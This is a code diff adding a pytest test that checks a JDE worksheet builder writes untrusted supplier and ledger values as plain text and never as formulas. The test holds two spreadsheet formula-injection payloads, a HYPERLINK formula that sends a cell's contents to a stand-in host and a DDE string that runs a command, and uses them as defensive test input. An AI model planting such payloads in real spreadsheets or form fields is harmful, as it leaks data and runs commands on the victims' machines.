@@ -89,6 +89,16 @@ def test_the_drop_down_answer_and_a_mapping_row_round_trip():
     assert [jde.ani(m) for m in s.gl_map] == ["100.6010.01"]
 
 
+def test_the_worksheet_holds_no_formula_from_a_document():
+    evil = '=HYPERLINK("http://x.example/?"&A1,"Click")'
+    data = jde_worksheet.build(jde.JdeSettings(), [{"code": "6010", "description": "+cmd|' /C calc'!A0"}],
+                               [{"vendor_name": evil}], lambda name: "")  # fmt: skip
+    wb = openpyxl.load_workbook(io.BytesIO(data))
+    cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row]
+    assert not [c.coordinate for c in cells if c.data_type == "f"]
+    assert wb["Suppliers"]["A2"].value == evil  # kept as text, word for word
+
+
 @pytest.mark.parametrize("content", [b"not a workbook", b"PK\x03\x04 broken zip"])
 def test_a_file_that_is_not_the_worksheet_is_refused(content):
     result = jde_worksheet.read(content, jde.JdeSettings())
